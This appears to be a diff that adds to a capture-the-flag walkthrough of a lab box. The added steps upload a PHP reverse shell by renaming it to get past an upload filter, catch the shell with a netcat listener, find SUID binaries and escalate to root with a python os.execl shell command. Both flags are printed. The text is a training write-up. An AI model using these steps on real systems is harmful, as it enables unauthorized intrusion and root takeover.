@@ -50,5 +50,81 @@ As we have an option gto upload files, let try to upload a malicious file and ru
 Download the PHP files from Github. You can try using - https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
 
 Once the PHP file is downloaded on the firefox browser, save the doc on the Desktop. 
-While trying to upload the PHP file, app throws an error. Lets try to rename the file as Shell.PHTML. This will helps in uploading the file 
+While trying to upload the PHP file, app throws an error. Lets try to rename the file as Shell.PHTML. This will helps in uploading the file.
+Once the file has been uploaded, go to http://<TargetIP>/uploads and run the file. 
+If the app throws error, we need to make changes inside the file. 
+Open the file >> change $IP to <<attackbox IP address>> (IP on which you want to get the connection). Also make note of the port number. 
+
+Ctrl+S to save the file. 
+Next, we need to create connection.n For creating connection use netcat. 
+Command 
+nc -lvnp 1234
+
+Explanation 
+nc -netcat, Often called the “Swiss Army knife of networking”.
+-lvnp - listen, verbose, numerric, port 
+
+now run the file from uploads page. You will see a active connection on the terminTHM{y0u_g0t_a_sh3ll}
+al. 
+run the commands and check if you can find user.txt file 
+we can use 
+
+Command 
+find / -type f -name "user.txt" 2>/dev/null
+
+Explanation 
+find - searches for the file 
+/ - check for the entire file system 
+-type - type of file 
+-name - name of the file 
+> - saves to 
+/dev/null - all the null files and errors are sent to /dev/null 
+
+Result 
+
+/var/www/user.txt 
+Cat /var/www/user.txt 
+
+Result 
+THM{y0u_g0t_a_sh3ll}
+
+As per task 4, now lets get the root privilege access. 
+Serach for the file root.txt 
+command 
+find /-type f -perm -4000 2>/dev/null
+
+Explanation 
+ -perm - is the permission command 
+-4000 - this will check for file with root access 
+
+From the result list, select any file which can be used to get teh privilege access 
+/usr/bin/python2.7
+
+Reason to select  /usr/bin/python2.7, we can use GITFOBINS and easily get the python commands.
+Now perfomr ls -la, to get the details view of user permission. Upon checking we see that the file has SUID set.
+
+Result 
+$ ls -la /usr/bin/python2.7
+-rwsr-xr-x 1 root root 3657904 Dec  9  2024 /usr/bin/python2.7
+
+
+SUID - set User ID - The program runs with the permissions of the file owner, not the user who runs it.
+From google search for GITFOBINS >> Python >> SUID permission 
+
+Copy and paste the command in the terminal - python -c 'import os; os.execl("/bin/sh", "sh", "-p")'and enter 
+
+Once the command has been run, check if you can go to the root directcory.
+Cd root 
+if yes, you have got the privilege access and you can access the files which have root access. 
+
+Result 
+root.txt
+snap
+
+Command 
+cat root.txt
+
+Result 
+THM{pr1v1l3g3_3sc4l4t10n}
+
 
